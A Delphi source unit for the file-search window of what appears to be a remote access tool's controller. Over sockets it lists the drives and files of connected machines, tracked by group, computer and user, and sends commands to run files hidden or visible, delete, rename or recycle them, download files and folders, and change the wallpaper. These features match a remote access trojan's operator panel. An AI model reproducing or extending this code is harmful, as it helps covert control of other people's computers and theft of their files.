unit UnitFileSearch;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ExtCtrls, ScktComp, StdCtrls, Spin, umSFPack,zlib,ImageHLP,
  UnitFileTransfer,Menus, ImgList, ToolWin, ComCtrls , Jpeg,
  ClipBrd, UnitSharedData, shellapi,CommCtrl, UnitThumbDb, Buttons;

type
  TFileSearch = class(TForm)
    ListView1: TListView;
    Panel1: TPanel;
    Label1: TLabel;
    Edit1: TEdit;
    Splitter1: TSplitter;
    Label2: TLabel;
    BitBtn1: TBitBtn;
    CheckBox1: TCheckBox;
    BitBtn2: TBitBtn;
    BitBtn3: TBitBtn;
    StatusBar1: TStatusBar;
    Label3: TLabel;
    Edit3: TEdit;
    Edit2: TComboBoxEx;
    PopupMenu2: TPopupMenu;
    Execute1: TMenuItem;
    Visible1: TMenuItem;
    Hidden1: TMenuItem;
    N1: TMenuItem;
    Parameters1: TMenuItem;
    Delete1: TMenuItem;
    Recycle1: TMenuItem;
    Rename1: TMenuItem;
    Download1: TMenuItem;
    MenuItem2: TMenuItem;
    SetAsWallpaper1: TMenuItem;
    ImageList2: TImageList;
    ImageList1: TImageList;
    Timer1: TTimer;
    procedure BitBtn2Click(Sender: TObject);
    procedure BitBtn3Click(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure BitBtn1Click(Sender: TObject);
    procedure Parameters1Click(Sender: TObject);
    procedure Visible1Click(Sender: TObject);
    procedure Hidden1Click(Sender: TObject);
    procedure Delete1Click(Sender: TObject);
    procedure Recycle1Click(Sender: TObject);
    procedure Rename1Click(Sender: TObject);
    procedure Download1Click(Sender: TObject);
    procedure SetAsWallpaper1Click(Sender: TObject);
    procedure ListView1CustomDrawItem(Sender: TCustomListView;
      Item: TListItem; State: TCustomDrawState; var DefaultDraw: Boolean);
    procedure ListView1CustomDrawSubItem(Sender: TCustomListView;
      Item: TListItem; SubItem: Integer; State: TCustomDrawState;
      var DefaultDraw: Boolean);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure Timer1Timer(Sender: TObject);
  private
    { Private declarations }
    ExtensionList: TStringList;
    procedure UpdateFileIcons(Li: TListItem);
    procedure LoadFolders(Stream: TMemoryStream);
    procedure LoadDrives(Drives: string);
    procedure AddAllFolders(Folders: string);
  public
    { Public declarations }
    MainSocket: TCustomWinSocket;
    NewSocket: TCustomWinSocket;
    SocketData: TSocketData;
    Group,Computer,User: string;
    procedure ParseData(Socket: TCustomWinSocket; Data: string);
    procedure SetUpConnection(Socket: TCustomWinSocket);
  end;

  TFileSearchRec = record
    FindData: TWIN32FindData;
    Path: string[255];
  end;

  TSearchOptions = record
    Path: string[255];
    FileName: string[255];
    Filter: string[255];
    SubDirs: bool;
    Fuzzy: bool;
  end;

var
  FileSearch: TFileSearch;

implementation

uses UnitBrowseFolder, UnitSettings, UnitTransferManager, UnitMain;

{$R *.dfm}

procedure SendData(Socket: TCustomWinSocket; Data: string);
begin
  UnitSharedData.SendData(Socket,'FileSearch|' + Data);
end;

procedure DisconnectProc(Socket: TCustomWinSocket);
var
  SocketData: TSocketData;
begin
  SocketData := TSocketData(Socket.Data);
  if TFileSearch(SocketData.Form).NewSocket = nil then exit;
  TFileSearch(SocketData.Form).Timer1.Enabled := True;
  TFileSearch(SocketData.Form).NewSocket := nil;
  TFileSearch(SocketData.Form).Caption := TFileSearch(SocketData.Form).Caption + ' - [Offline]';
end;

procedure TFileSearch.SetUpConnection(Socket: TCustomWinSocket);
var
  SocketData: TSocketData;
begin
  SocketData := TSocketData(Socket.Data);
  SocketData.DisconnectProc := @DisconnectProc;
  Timer1.Enabled := False;
  Caption := Copy(Caption,1,Length(Caption) -12);
end;

function GetAttrib(FindData: TWIN32FindData):string;
begin
  Result := '';
  if FindData.dwFileAttributes and $00000020 <> 0 then Result := Result + 'A';
  if FindData.dwFileAttributes and $00000002 <> 0 then Result := Result + 'H';
  if FindData.dwFileAttributes and $00000001 <> 0 then Result := Result + 'R';
  if FindData.dwFileAttributes and $00000004 <> 0 then Result := Result + 'S';
end;

function FileTimeToDateTime(FileTime : TFileTime) : TDateTime;
var
  LocalTime : TFileTime;
  SystemTime : TSystemTime;
begin
  Result := EncodeDate(1900,1,1);
  FileTimeToLocalFileTime(FileTime, LocalTime);
  FileTimeToSystemTime(LocalTime, SystemTime);
  Result := SystemTimeToDateTime(SystemTime);
end;

procedure TFileSearch.UpdateFileIcons(Li: TListItem);
var
  ExtensionIndex: integer;
  SHFileInfo :TSHFileINfo;
begin
  if ExtensionList = nil then begin
    ExtensionList := TStringList.Create;
    ExtensionList.Add('File Folder');  //dummy file
  end;

  ExtensionIndex := ExtensionList.IndexOf(Li.SubItems[3]);

  if ExtensionIndex = -1 then begin
    ExtensionList.Add(Li.SubItems[3]);
    SHGetFileInfo(PChar(Li.SubItems[3]),FILE_ATTRIBUTE_NORMAL, SHFileInfo, SizeOf(SHFileInfo), SHGFI_ICON or SHGFI_SMALLICON or SHGFI_USEFILEATTRIBUTES );
    try
      ExtensionIndex := ImageList_AddIcon(ImageList2.Handle,SHFileInfo.hIcon);
    except
      ExtensionIndex := -1;
    end;
  end;

  Li.ImageIndex := ExtensionIndex;
end;

procedure TFileSearch.LoadFolders(Stream: TMemoryStream);
var
  Tn: TTreeNode;
  FindData: TWIN32FindData;
begin
  BrowseFolder.LastNode.DeleteChildren;
  while Stream.Position < Stream.Size do begin
    Stream.ReadBuffer(FindData,SizeOf(TWIN32FindData));
    if string(FindData.cFileName) = '.' then Continue;
    if FindData.cFileName = '..' then Continue;
    Tn := BrowseFolder.Treeview1.Items.AddChild(BrowseFolder.LastNode,FindData.cFileName);
    Tn.ImageIndex := 6;
    Tn.SelectedIndex := 6;
  end;
  BrowseFolder.LastNode.Expand(False);
end;

procedure TFileSearch.LoadDrives(Drives: string);
var
  Tn: TTreeNode;
  Temp: string;
  DriveLetter,DriveType,DriveSpace,DriveAttrib: string;
  TotalSize: int64;
  Li: TListItem;
  Stream: TMemoryStream;
begin
  BrowseFolder.LastNode := BrowseFolder.Treeview1.Items[0];
  while Length(Drives) > 0 do begin

    DriveLetter := Split(Drives,'|',1);
    Delete(Drives,1,Length(DriveLetter)+1);

    DriveType := Split(Drives,'|',1);
    Delete(Drives,1,Length(DriveType)+1);

    Tn := BrowseFolder.Treeview1.Items.AddChild(BrowseFolder.LastNode,DriveLetter);

    case strtoint(DriveType) of
      DRIVE_UNKNOWN: Tn.ImageIndex := 0;
      DRIVE_REMOVABLE: Tn.ImageIndex := 1;
      DRIVE_FIXED: Tn.ImageIndex := 2;
      DRIVE_REMOTE: Tn.ImageIndex := 3;
      DRIVE_CDROM: Tn.ImageIndex := 4;
      DRIVE_RAMDISK: Tn.ImageIndex := 5;
    end;
    Tn.SelectedIndex := Tn.ImageIndex;



  end;
  BrowseFolder.LastNode.Expand(False);
end;

function FindNode(Caption: string; Treeview: TTreeview; node: TTreenode): TTreeNode;
var
  i: integer;
begin
  result := nil;
  if Node = nil then begin
    for i := 0 to treeview.Items.Count -1 do begin
      if uppercase(treeview.Items[i].Text) = uppercase(caption) then result := treeview.Items[i];
      //BREAK;
    end;
  end else begin
    for i := 0 to node.Count -1 do begin
      if uppercase(node.Item[i].Text) = uppercase(caption) then result := node.Item[i];
      //BREAK;
    end;
  end;
end;

procedure TFileSearch.AddAllFolders(Folders: string);
var
  tmp: string;
  node: ttreenode;
begin
  BrowseFolder.lastnode := nil;
  while length(Folders) > 0 do begin
    tmp := Split(Folders,'\',1);
    delete(Folders,1,length(tmp)+1);
    if length(tmp) = 2 then tmp := tmp + '\';
    node := FindNode(tmp,BrowseFolder.Treeview1,BrowseFolder.LastNode);
    if node = nil then begin
      Node := BrowseFolder.Treeview1.Items.AddChild(BrowseFolder.LastNode,tmp);
      Node.ImageIndex := 6;
      Node.SelectedIndex := 6;
      Node.Expand(False);
    end else begin
      //Node := Treeview1.Items.AddChild(Node,Tmp);
      Node.Expand(False);
    end;
    if node.Parent <> nil then node.Parent.Expand(false);
    BrowseFolder.lastnode := node;
    BrowseFolder.lastnode.Expand(false);
  end;
end;

{function FindTransferManager(MainSocket: TCustomWinSocket; SocketData: TSocketData): TTransferManager;
var
  i: integer;
begin
  Result := nil;
  for i := 0 to Screen.FormCount -1 do begin
    if Screen.Forms[i].ClassType <> TTransferManager then Continue;
    if TTransferManager(Screen.Forms[i]).MainSocket = MainSocket then begin
      Result := TTransferManager(Screen.Forms[i]);
      Exit;
    end;
  end;
  if Result = nil then begin
    Result := TTransferManager.Create(nil);
    Result.Caption := SocketData.ServerData.Name + ' - Transfer Manager';
    Result.SocketData := SocketData;
    Result.MainSocket := SocketData.MainSocket;
    SocketData.Form := Result;
    UnitSharedData.SendData(MainSocket,'NewConnection|TransferManagerSocket|' + inttostr(Result.Handle));
  end;
end;}

procedure TFileSearch.ParseData(Socket: TCustomWinSocket; Data: string);
var
  Command: string;
  Stream: TMemoryStream;
  Li: TListItem;
  FileRec: TFileSearchRec;
  Tmp: string;
begin
  Command := Split(Data,'|',1);
  Delete(Data,1,Length(Command)+1);

  if Command = 'Files' then begin
    Application.ProcessMessages;
    Stream := TMemoryStream.Create;
    Stream.Write(pointer(Data)^,Length(Data));
    Stream.Position := 0;
    while Stream.Position < Stream.Size do begin
      Application.ProcessMessages;
      Stream.ReadBuffer(FileRec,SizeOf(TFileSearchRec));
      if (string(FileRec.FindData.cFileName) = '.') or (FileRec.FindData.cFileName = '..') then Continue;
      Li := Listview1.Items.Add;
      Li.Caption := FileRec.FindData.cFileName;
      Li.SubItems.Add(FileRec.Path);
      Li.SubItems.Add(inttostr(FileRec.FindData.nFileSizeLow div 1024));
      Li.SubItems.Add(GetAttrib(FileRec.FindData));
      if (FileRec.FindData.dwFileAttributes and $00000010 = 0) then begin
        Li.SubItems.Add(uppercase(extractfileext(FileRec.FindData.cFileName)));
        UpdateFileIcons(Li);
      end else begin
        Li.SubItems.Add('File Folder');
        Li.ImageIndex := 0;
      end;
      Li.SubItems.Add(DateTimeToStr(FileTimeToDateTime(FileRec.FindData.ftCreationTime)));
      Application.ProcessMessages;
    end;
    Stream.Free;
    Application.ProcessMessages;
  end;

  if Command = 'SearchComplete' then begin
    BitBtn2.Enabled := True;
    BitBtn3.Enabled := False;
  end;

  if Command = 'DriveList' then begin
    LoadDrives(Data);
  end;

  if Command = 'FolderList' then begin
    Command := Split(Data,'|',1);
    Delete(Data,1,Length(Command)+1);
    BrowseFolder.LastPath := Command;
    AddAllFolders(Command);
    Stream := TMemoryStream.Create;
    Stream.WriteBuffer(pointer(Data)^,Length(Data));
    Stream.Position := 0;
    LoadFolders(Stream);
    Stream.Free;
  end;

  if Command = 'DownloadFolder' then begin
    Application.ProcessMessages;
    Stream := TMemoryStream.Create;
    Stream.Write(pointer(Data)^,Length(Data));
    Stream.Position := 0;
    while Stream.Position < Stream.Size do begin
      Application.ProcessMessages;
      Stream.ReadBuffer(FileRec,SizeOf(TFileSearchRec));
      Li := ClientForm.FindTransferManager(MainSocket,SocketData).Listview1.Items.Add;
      Li.Caption := FileRec.FindData.cFileName;
      if Settings.CheckBox1.Checked then begin
        Tmp := FileRec.Path;
        Delete(Tmp,1,3);
        Li.SubItems.Add(SocketData.DownloadPath + Tmp + FileRec.FindData.cFileName);
      end else begin
        Li.SubItems.Add(SocketData.DownloadPath + FileRec.FindData.cFileName);
      end;
      Li.SubItems.Add(FileRec.Path + string(FileRec.FindData.cFileName));
      Li.SubItems.Add(inttostr(FileRec.FindData.nFileSizeLow div 1024));
      Li.SubItems.Add('0');
      Li.SubItems.Add('0');
      Li.SubItems.Add('00:00:00');
      Li.SubItems.Add('Pending');
      Li.ImageIndex := 18;
      Application.ProcessMessages;
    end;
    Stream.Free;
    Application.ProcessMessages;
  end;




end;


procedure TFileSearch.BitBtn2Click(Sender: TObject);
var
  SearchOptions: TSearchOptions;
  Data: string;
  Stream: TMemoryStream;
begin
  if Edit2.Text = '' then exit;
  Listview1.Clear;
  SearchOptions.Path := Edit2.Text;
  SearchOptions.FileName := Edit1.Text;
  SearchOptions.Filter := Edit3.Text;
  SearchOptions.SubDirs := Checkbox1.Checked;
  //SearchOptions.Fuzzy := Checkbox2.Checked;
  Stream := TMemoryStream.Create;
  Stream.Write(SearchOptions,SizeOf(TSearchOptions));
  SetString(Data,pchar(Stream.memory),Stream.size);
  STream.Free;
  SendData(NewSocket,'Search|' + Data);
  BitBtn2.Enabled := False;
  BitBtn3.Enabled := True;
end;

procedure TFileSearch.BitBtn3Click(Sender: TObject);
begin
  //BitBtn2.Enabled := True;
  //BitBtn3.Enabled := False;
  SendData(NewSocket,'StopSearch');
end;


procedure ConvertTo32BitImageList(const ImageList: TImageList);
const
  Mask: array[Boolean] of Longint = (0, ILC_MASK);
var
  TemporyImageList: TImageList;
begin
  if Assigned(ImageList) then
  begin
    TemporyImageList := TImageList.Create(nil);
    try
      TemporyImageList.Assign(ImageList);
      with ImageList do
      begin
        ImageList.Handle := ImageList_Create(Width, Height, ILC_COLOR32 or Mask[Masked], 0, AllocBy);
        if not ImageList.HandleAllocated then
        begin
          //raise EInvalidOperation.Create(SInvalidImageList);
        end;
      end;
      ImageList.AddImages(TemporyImageList);
    finally
      TemporyImageList.Free;
    end;
  end;
end;

procedure TFileSearch.FormCreate(Sender: TObject);
begin
  ConvertTo32BitImageList(ImageList2);
end;

procedure TFileSearch.BitBtn1Click(Sender: TObject);
begin
  BrowseFolder.TreeView1.Items[0].DeleteChildren;
  SendData(NewSocket,'DriveList');
  BrowseFolder.NewSocket := NewSocket;
  if BrowseFolder.ShowModal <> mrOk then exit;
  Edit2.Text := BrowseFolder.LastPath;
end;

procedure TFileSearch.Parameters1Click(Sender: TObject);
begin
  Parameters1.Checked := not Parameters1.Checked;
end;

procedure TFileSearch.Visible1Click(Sender: TObject);
var
  Number: integer;
  Param: string;
begin
  if Parameters1.Checked then Param := inputbox('Parameters','Enter Parameters','');
  for Number := 0 to ListView1.Items.Count -1 do begin
    if not listview1.Items[Number].Selected then continue;
    SendData(NewSocket,'Execute|' + listview1.Items[Number].SubItems[0] + listview1.Items[Number].Caption + '|' +  Param + '|' + inttostr(SW_SHOWNORMAL));
  end;
end;

procedure TFileSearch.Hidden1Click(Sender: TObject);
var
  Number: integer;
  Param: string;
begin
  if Parameters1.Checked then Param := inputbox('Parameters','Enter Parameters','');
  for Number := 0 to ListView1.Items.Count -1 do begin
    if not listview1.Items[Number].Selected then continue;
    SendData(NewSocket,'Execute|' + listview1.Items[Number].SubItems[0] + listview1.Items[Number].Caption + '|' +  Param + '|' + inttostr(SW_HIDE));
  end;
end;

procedure TFileSearch.Delete1Click(Sender: TObject);
var
  Number: integer;
begin
  for Number := 0 to ListView1.Items.Count -1 do begin
    if not listview1.Items[Number].Selected then continue;
    SendData(NewSocket,'Delete|' + listview1.Items[Number].SubItems[0] + listview1.Items[Number].Caption);
  end;
end;

procedure TFileSearch.Recycle1Click(Sender: TObject);
var
  Number: integer;
begin
  for Number := 0 to ListView1.Items.Count -1 do begin
    if not listview1.Items[Number].Selected then continue;
    SendData(NewSocket,'Recycle|' + listview1.Items[Number].SubItems[0] + listview1.Items[Number].Caption);
  end;
end;

procedure TFileSearch.Rename1Click(Sender: TObject);
var
  i: integer;
  filename: string;
  data: string;
  n: integer;
begin
  filename := inputbox('Rename File','Enter New File Name',Listview1.Selected.Caption);

  if Listview1.SelCount = 1 then begin
    data := 'Rename|' + listview1.Selected.SubItems[0] + Listview1.Selected.Caption + '|' + listview1.Selected.SubItems[0] + FileName;
    SendData(NewSocket,Data);
    exit;
  end;

  n := 0;
  for i := 0 to listview1.Items.Count -1 do begin
    if not listview1.Items[i].Selected then Continue;
    data := 'Rename|' + listview1.Items[i].SubItems[0] + Listview1.Items[i].Caption + '|' + listview1.Items[i].SubItems[0] + '(' + inttostr(n) + ')' + FileName;
    Listview1.Items[i].Caption := '(' + inttostr(n) + ')' + FileName;
    inc(n);
    SendData(NewSocket,Data);
  end;

end;



procedure TFileSearch.Download1Click(Sender: TObject);
var
  i: integer;
  li: tlistitem;
  tmp: string;
begin
  for i := 0 to Listview1.Items.Count -1 do begin
    if not Listview1.Items[i].Selected then Continue;

    if Listview1.Items[i].SubItems[3] = 'File Folder' then begin
      SendData(NewSocket,'DownloadFolder|' + Listview1.Items[i].SubItems[0] + Listview1.Items[i].Caption);
      Continue;
    end;

    li := ClientForm.FindTransferManager(MainSocket,SocketData).ListView1.Items.Add;
    li.Caption := Listview1.Items[i].Caption;

    if Settings.CheckBox1.Checked then begin
      Tmp := listview1.Items[i].SubItems[0];
      Delete(Tmp,1,3);
      Li.SubItems.Add(SocketData.DownloadPath + Tmp + Listview1.Items[i].Caption);
    end else begin
      Li.SubItems.Add(SocketData.DownloadPath + Listview1.Items[i].Caption);
    end;

    Li.SubItems.Add(listview1.Items[i].SubItems[0] + Listview1.Items[i].Caption);
    Li.SubItems.Add(Listview1.Items[i].SubItems[1]);
    Li.SubItems.Add('0');
    Li.SubItems.Add('0');
    Li.SubItems.Add('00:00:00');
    Li.SubItems.Add('Pending');
    Li.ImageIndex := 18;

  end;
end;

procedure TFileSearch.SetAsWallpaper1Click(Sender: TObject);
begin
  senddata(NewSocket,'SetWallpaper|' + Listview1.Selected.SubItems[0] + Listview1.Selected.Caption);
end;

procedure TFileSearch.ListView1CustomDrawItem(Sender: TCustomListView;
  Item: TListItem; State: TCustomDrawState; var DefaultDraw: Boolean);
begin
  Listview1.Canvas.Brush.Color := $F7F7F7;
end;

procedure TFileSearch.ListView1CustomDrawSubItem(Sender: TCustomListView;
  Item: TListItem; SubItem: Integer; State: TCustomDrawState;
  var DefaultDraw: Boolean);
begin
  Listview1.Canvas.Brush.Color := clWhite;
end;

procedure TFileSearch.FormClose(Sender: TObject; var Action: TCloseAction);
var
  TmpSocket: TCustomWinSocket;
begin
  Action := caFree;
  try
    TmpSocket := NewSocket;
    NewSocket := nil;
    if TmpSocket <> nil then TmpSocket.Close;
  except
  end;
end;

procedure TFileSearch.Timer1Timer(Sender: TObject);
var
  NewSocketData: TSocketData;
  Li: TListItem;
begin
  Li := GetListItem(Group,Computer,User);
  if Li = nil then exit;
  if Li.Data = nil then exit;
  NewSocketData := TSocketData(Li.Data);
  if NewSocketData.MainSocket = nil then exit;
    UnitSharedData.SendData(NewSocketData.MainSocket,'NewConnection|FileSearchSocket|' + inttostr(Self.Handle));
end;

end.
